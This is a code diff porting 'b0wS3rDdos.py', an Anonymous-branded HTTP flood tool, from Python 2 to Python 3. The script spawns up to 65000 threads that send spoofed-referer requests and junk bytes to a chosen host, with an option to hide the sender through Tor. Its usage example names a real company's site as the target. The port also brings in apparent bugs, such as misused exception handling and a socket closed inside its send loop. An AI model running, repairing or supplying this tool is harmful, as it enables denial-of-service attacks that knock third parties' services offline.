@@ -10,15 +10,11 @@ import math
 import getopt
 import socks
 import string
-import terminal
-
 from threading import Thread
 
 global stop_now
-global term
 
 stop_now = False
-term = terminal.TerminalController()
 referers = [ 
 "http://www.google.com/?q="
 "http://www.usatoday.com/search/results?q="
@@ -69,7 +65,6 @@ referers = [
 ]
 
 useragents = [
- "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
@@ -98,6 +93,7 @@ useragents = [
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
+ "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
@@ -207,24 +203,24 @@ useragents = [
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
-"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
-"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
-"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
-"Gecko/20100101 Firefox/5.0.1",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
-"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
-"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
-"Presto/2.9.168 Version/11.50",
-"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
-"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
-"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
-"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
-"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
-"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
-"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
-"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
+ "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
+ "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
+ "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
+ "Gecko/20100101 Firefox/5.0.1",
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
+ "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
+ "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
+ "Presto/2.9.168 Version/11.50",
+ "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
+ "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
+ "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
+ "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
+ "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
+ "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
+ "Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
 ]
 #builds random ascii string(Imported this shit from Hulk.py:)
 def buildblock(self, size):
@@ -243,17 +239,17 @@ def buildblock(self, size):
         return out_str
 
 class httpPost(Thread):
-    def __init__(self, host, port, tor):
+    def __init__(self, host, port=None, tor=None):
         Thread.__init__(self)
         self.host = host 
         self.port = port
-        self.socks = socks.socksocket()
+        self.socks = socks.socket.socket()
         self.tor = tor
         self.running = True
 		
     def _send_http_get(self, pause = random.randrange(1, 10)):
-	global stop_now
-	self.socks.send("GET / HTTP/1.1\r\n"
+        global stop_now
+        self.socks.send("GET / HTTP/1.1\r\n"
 			"Host: %s\r\n"
 			"User-Agent: %s\r\n"
 			"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
@@ -264,60 +260,58 @@ class httpPost(Thread):
 			"Content-Length: 42\r\n\r\n" %
 			#"Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
 			(self.host, random.choice(useragents)))
-			
-
         for i in range(0, 9999):
             if stop_now:
                 self.running = False
                 break
-            p = random.choice(string.letters+string.digits)
-	    data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
-	    packet = random.choice(data)
-	    magic = random.choice(packet+p)
-            print term.BOL+term.UP+term.CLEAR_EOL+"SENDING PACKETS!: %s" % magic+term.NORMAL
+            p = random.choice(string.ascii_letters+string.digits)
+            data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
+            packet = random.choice(data)
+            magic = random.choice(packet+p)
+            print(f"SENDING PACKETS!: {magic}") 
             self.socks.send(magic)
             time.sleep(random.uniform(0.1, 3))
-	
-        self.socks.close()
+            self.socks.close()
 		
     def run(self):
         while self.running:
             while self.running:
                 try:
-                    if self.tor: 
-			self.socks = socks.socksocket()
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                    if self.tor:
+                        self.socks = socks.socket.socket()
+                            
+                    self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Stressing target!!"+ term.NORMAL
+                    print ("Stressing target!!")
                     break
-                except Exception, e:
-                    if e.args[0] == 106 or e.args[0] == 60:
+                except Exception:
+                    if Exception.args[0] == 106 or Exception.args[0] == 60:
                         break
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Failed - Make sure you removed http://"+ term.NORMAL
+                    print ("Failed - Make sure you removed http://")
                     time.sleep(1)
                     continue
 	
             while self.running:
                 try:
                     self._send_http_get()
-                except Exception, e:
-                    if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL                       
-			self.socks = socks.socksocket()
-                        break
+                except Exception:
+                    if Exception.args[0] == 32 or Exception.args[0] == 104:
+                        print("Thread broken, restarting...")                       
+                    self.socks = socks.socksocket()
+                    break
                     time.sleep(1)
                     pass
  
 def usage():
-    print "./b0wS3rDdos.py -t <target> [-r <threads> -p <port> -T -h]"
-    print "---b0wS3r---"
-    print " Make sure you don't execute with http:// in your url"
-    print " -t|--target <Hostname|IP>"
-    print " -r|--threads <Number of threads> Defaults to 65000"
-    print " -p|--port <Web Server Port> Defaults to 80"
-    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
-    print " -h|--help Shows this help\n" 
-    print "Eg. ./b0wS3rDdos.py -t www.rothschild.com -r 65000\n"
+    print ("./b0wS3rDdos.py -t <target> [-r <threads> -p <port> -T -h]")
+    print ("---b0wS3r---")
+    print (" Make sure you don't execute with http:// in your url")
+    print (" -t|--target <Hostname|IP>")
+    print (" -r|--threads <Number of threads> Defaults to 65000")
+    print (" -p|--port <Web Server Port> Defaults to 80")
+    print (" -T|--tor Enable anonymising through tor on 127.0.0.1:9050")
+    print (" -h|--help Shows this help\n" )
+    print ("Eg. ./b0wS3rDdos.py -t www.rothschild.com -r 65000\n")
 
 def main(argv):
     
@@ -351,11 +345,11 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print term.DOWN + term.RED + "/*" + term.NORMAL
-    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
-    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
-    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
-    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL
+    print("/*")
+    print (f" * Target: {target} Port: {port}")
+    print (f" * Threads: {threads} Tor: {tor}")
+    print (" * Give 20 seconds without tor or 40 with before checking site")
+    print (" */")
 
     rthreads = []
     for i in range(threads):
@@ -367,20 +361,20 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print("\nShutting down threads...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
 
 if __name__ == "__main__":
-    print "\n/*"
-    print " *"+term.GREEN + "Anonymous"
-    print " * We Do Not Forgive"
-    print " * We Do Not Forget"
-    print " * We are The Voice of the Voiceless "
-    print " * We Are Legion"
-    print " */\n"
+    print ("\n/*")
+    print (" * Anonymous")
+    print (" * We Do Not Forgive")
+    print (" * We Do Not Forget")
+    print (" * We are The Voice of the Voiceless ")
+    print (" * We Are Legion")
+    print (" */\n")
 
-    main(sys.argv[1:])
+main(sys.argv[1:])
 
 
